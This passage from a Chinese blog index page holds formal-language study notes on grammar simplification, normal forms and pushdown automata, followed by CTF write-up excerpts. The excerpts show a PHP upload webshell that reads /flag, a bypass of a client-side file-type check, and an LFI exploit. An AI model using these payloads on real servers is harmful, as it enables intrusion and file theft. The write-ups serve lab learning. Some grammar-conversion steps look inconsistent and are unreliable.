- 无用符号的消除
- 空产生式的消除
- 单一产生式的消除

## 无用符号的删除

我们给无用符号以下含义:

- 从初始符号开始, 无法到达的符号都是无用的, 可以删除
- 从每个终结符开始, 无法归约到的符号都是无用的, 可以删除

于是我们去除无用符号的算法可以描述为:

1. 将初始符号加入一个集合, 并向后推导符号, 并将推导出的符号加入集合, 迭代直到集合不产生变化
2. 将所有终结符加入一个集合, 并向前推导符号, 并将推导出的符号加入集合, 迭代直到集合不产生变化
3. 不在两个集合中的符号都是无用的, 可以删除

## 空产生式的删除

除了语言本身就是空的情况, 文法中的其他空产生式都可以删除

删除的方式可以简单概括为:

- 将所有的空产生式产生的空符号, 带入上一级的符号中, 令其产生新的推导式, 并删除该空产生式

语言描述比较抽象, 通过以下例子说明:

- 原文法
  - S -&gt; aA
  - A -&gt; b|ε
- 将A等于空的情况带入S中, 得到
  - S -&gt; a|aA
- 删除空产生式A -&gt; ε, 得到
  - S -&gt; a|aA
  - A -&gt; b

## 单一产生式的删除

我们认为由一个非终结符推导出一个非终结的产生式是无用的, 可以用类似空产生式替换的方法删除, 例子如下:

- 原文法
  - S -&gt; aA
  - A -&gt; aB|cD|e|F
  - F -&gt; a|cB

- 这里的A -&gt; F是一个单一产生式, 是无用的, 通过将F的产生式带入A中, 得到删减后的文法:
- S -&gt; aA
- A -&gt; aB|cD|e|a|cB

## tips

- 由于删除单一产生式和空产生式有可能产生新的无用符号, 所以需要在最后再执行一遍无用符号的删除

---

# 上下文无关文法的规范

- 乔姆斯基范式
- 格雷巴赫范式

## 乔姆斯基范式

$$
A \rightarrow BC\\
A \rightarrow a\\
$$

## 格雷巴赫范式

$$
A \rightarrow a\\
A \rightarrow aA_1A_2...A_n
$$

为何得到格雷巴赫范式, 我们需要以下三个步骤:

- 1. 将CFG简化
- 2. 将CFG转化为CNF
- 3. 将CNF中的左递归去除
- 4. 将CNF转换为CFG

例子: 将CFG转换为CNF:
$$
S → aSb | bSa | SS | a
$$

1. 化简
$$
S → aSb | bSa | SS | a |
$$
本身已是最简
2. 转化为CNF

- $$
  S → ASB | BSA | SS\\
  S → a\\
  $$
- $$
  S → AX | BY | SS | a\\
  X → SB\\
  Y → SA\\
  A → a\\
  B → b\\
  $$

3. 去除左递归
  左递归为$S → SS$, 删除步骤如下:

- 首先删除$S → SS$, 添加$C → SSC|\epsilon$
- 将$C$添加到每个其他$S$的产生式中, 得到:
    $$
    S → AXC | BYC | aC\\
    C → SSC | ε\\
    X → SB\\
    Y → SA\\
    A → a\\
    B → b\\
    $$
- 删除空产生式:
    $$
    S → AXC | BYC | aC | AX | BY | a\\
    C → SSC | SS\\
    X → SB\\
    Y → SA\\
    A → a\\
    B → b\\
    $$

4. 替换首个变量:
    $$
    S → aXC | bYC | aC | aX | bY | a\\
    C → aSC | aS\\
    X → aB\\
    Y → aA\\
    A → a\\
    B → b\\
    $$
将CFG转换为GNF将有利于我们为其构造等价的下推自动机(PDA)

---

# 下推自动机

下推自动机在有限状态自动机的基础上, 添加了一个栈结构, 用来模拟文法的推导过程:

比如我们有以下文法:
$$
S → AB\\
A → 0A | ε\\
B → 0B1 | 01
$$

我们的推导过程如下:

`S` -&gt; `AB` -&gt; `0AB` -&gt; `AB + out:0` -&gt; `B` -&gt; `01` -&gt; `out: 01`

最后的输出为`001`
左为栈顶, 右为栈底, 这个过程在栈上完成

于是下推自动机就引入一个栈, 来表示文法的推导过程

现在假如我们有一段输入`001`, 并且PDA栈中的元素只有开始状态$S$, 我们从左到右开始读取, 如果读取到0时, 我们可以找到正向推导中有0输出的一步, 但是并没有找到栈中为$S$时的读0情况, 所以我们认为此时为读空, 所以将$S$取出, 替代为$AB$

这个第一步记为:
$$\delta(q_0, \epsilon, S) = (q_0, AB)$$

类似的我们可以写出这个PDA的所有转换:
$$
\delta(q_0, \epsilon, A) = (q_0, 0A)\\
\delta(q_0, \epsilon, A) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, B) = (q_0, 0B1)\\
\delta(q_0, \epsilon, B) = (q_0, 01)\\
\delta(q_0, \epsilon, 1) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, 0) = (q_0, \epsilon)\\
$$
这是全部读取写为空的情况, 也可以写为不为空的情况, 写法可以自由决定:
$$
\delta(q_0, 0, A) = (q_0, A)\\
\delta(q_0, \epsilon, A) = (q_0, \epsilon)\\
\delta(q_0, 0, B) = (q_0, B1)\\
\delta(q_0, 0, B) = (q_0, 1)\\
\delta(q_0, \epsilon, 1) = (q_0, \epsilon)\\
\delta(q_0, \epsilon, 0) = (q_0, \epsilon)\\
$$

可以用状态转移图来表示:
```Mermaid
stateDiagram
    [*] --&gt; q0
    q0 --&gt; q0: 0, A/A
```
表示读0时, 栈顶为A时, 取出A, 替换为A

PDA的接收状态有两类, 一类是空栈接收, 一类是终态接收:
- 空栈接收: 只要输入$w$能够使PDA进入空栈状态, 我们则接收句子
- 终态接收: 只要输入$w$能够使PDA进入终态, 我们则接收句子
两种接收可以互相转换

由PDA推导CFG的过程实在不好写, 跳过不记了, 原理其实相当简单


    </span>

  </div>

</div>



  
  
  

<div class="card" style="justify-content: left;">

  <div class="card-content">

    <div class="card-info-warp">
      <div class="card-info">
        2023-04-05
      </div>
      <div class="card-info">
        2k字
      </div>
      <div class="card-info">
        阅读时间: 2 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <div style="transform: translateX(10px);">
      <a class="card-title" href="/2023/04/05/ctf-note/upload-attack/">
        闲人的ctf记录
      </a>
      <span class="card-abstract" style="transform: translateX(0px);">
        
upload一共包含了20个pass

每个pass要上传一个文件以攻击服务器
比如题目提供的server框架是php环境的, 所以我们可以通过提交一个php文件来攻击服务器

比如我写了如下php代码
```php
&lt;!-- 输出当前目录全部文件和文件夹 --&gt;
&lt;?php
$dir = opendir(&#39;.&#39;);
while($file = readdir($dir)){
    echo $file.&#39;&lt;br&gt;&#39;;
}
closedir($dir);
?&gt;

&lt;!-- 输出根文件夹下的flag --&gt;

&lt;?php
$dir = opendir(&#39;/&#39;);
while($file = readdir($dir)){
    if($file == &#39;flag&#39;){
        echo file_get_contents(&#39;/flag&#39;);
    }
}
closedir($dir);
?&gt;
```
我只要想办法将其上传到服务器, 并知道其在服务器中的位置就可以远程执行脚本攻击

当然, 服务器不会就这么让你上传木马文件, 所以会采取各类措施来保证服务端的安全, 我们需要做的就是想办法绕过这些安全检测

---

## pass 1
这道题要上传一个webshell, 如果我们上传非图片格式文件, 网页会在本地的js脚本中检测文件名来判断是否为图片

由于检测发生在本地, 所以解决方式多种多样, 我们可以直接看如下代码:
```js
&lt;script type=&#34;text/javascript&#34;&gt;
    function checkFile() {
        var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;
        if (file == null || file == &#34;&#34;) {
            alert(&#34;请选择要上传的文件!&#34;);
            return false;
        }
        //定义允许上传的文件类型
        var allow_ext = &#34;.jpg|.png|.gif&#34;;
        //提取上传文件的类型
        var ext_name = file.substring(file.lastIndexOf(&#34;.&#34;));
        //判断上传文件类型是否允许上传
        if (allow_ext.indexOf(ext_name) == -1) {
            var errMsg = &#34;该文件不允许上传，请上传&#34; + allow_ext + &#34;类型的文件,当前文件类型为：&#34; + ext_name;
            alert(errMsg);
            return false;
        }
    }
&lt;/script&gt;
```
我选择在`allow_ext`中添加`.php`来绕过检测, 然后上传文件

然后网页会对上传的文件进行反馈显示, 监测网络传输可以找到上传文件的目录:

```
GET /upload/interlude_fubuki.png HTTP/1.1
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6
Cache-Control: no-cache
Host: dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81
Pragma: no-cache
Proxy-Connection: keep-alive
Referer: http://dd8934b9-6fe8-492e-9bdd-59ae1bf61dfe.node4.buuoj.cn:81/Pass-01/index.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62
```
于是我们只要对该目录下上传的php文件进行请求即可完成攻击
      </span>
    </div>
  </div>

  <div class="card-img">
    <div class="img-container"></div>
  </div>

</div>



  
  
  
<div class="card" style="justify-content: right;">

  <div class="card-img">
    <div class="img-container"></div>
  </div>

  <div class="card-content">
    <div class="card-info-warp">
      <div class="card-info">
        2023-04-04
      </div>
      <div class="card-info">
        935字
      </div>
      <div class="card-info">
        阅读时间: 1 mins.
      </div>
    </div>
    <div style="display: flex;">
      <svg xmlns="http://www.w3.org/2000/svg" width="392" height="2" viewBox="0 0 392 2" fill="none">
        <path d="M0 1L392 1.00003" stroke="#A5BFF2" />
      </svg>
    </div>
    <a class="card-title" href="/2023/04/04/ctf-note/linux-usage/">
      闲人的ctf记录
    </a>
    <span class="card-abstract">
      
CFT的题包含的知识面相当广泛, 多做一做能学到不少东西, 所以在一天最后的时间里, 不妨看几道CTF题, 拓展拓展能力

---
## Basic Linux Lab
这道题目要求登录指定的linux服务器并找到flag, 给出了服务器域名和端口, 所以我们使用ssh指令登录服务器:
```bash
ssh -pxxxxx root@xxx.xxx.xxx.xxx
```
登录之后检查文件目录:
```bash
ls -a
cd ~
ls -a
ls -All
```
几番查找下找到`flag.txt`文件, vim打开获得内容:
```bash
vim flag.txt
```

---
## Basic LFI COURSE 1

`LFI(Local File Inclusion)是一种常见的web漏洞, 通过构造恶意的url, 可以让服务器读取本地文件, 从而获取敏感信息`

于是题目给了我们一个网址, 打开以后显示如下内容:
```html
&lt;?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

highlight_file(__FILE__);

if(isset($_GET[&#39;file&#39;])) {
    $str = $_GET[&#39;file&#39;];

    include $_GET[&#39;file&#39;];
}
```
看起来是包含了一段php脚本, highlight_file返回了脚本的高亮显示
`$_GET[&#39;file&#39;]`从传递参数中获得`file`并包含这个文件, 所以我需要知道服务器中的flag的位置
虽然直接输入`file=/flag`就找到答案就是了

---

## Basic BUU BRUTE 1
简单的爆破, 没什么值得说的, 需要注意的是请求过快会导致服务器拒绝服务, 所以需要控制并行的请求速度
    </span>

  </div>

</div>



  
</div>



<div id="paginator">
  <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/5/">Next</a>
</div>
    </div>

  </div>



  
  <!-- scripts list from theme config.yml -->
  
  <script src="/js/layout/animation.js"></script>
  
  <script src="/js/layout/svg.js"></script>
  
  <script src="/js/csstool.js"></script>
  
  

</body>

</html>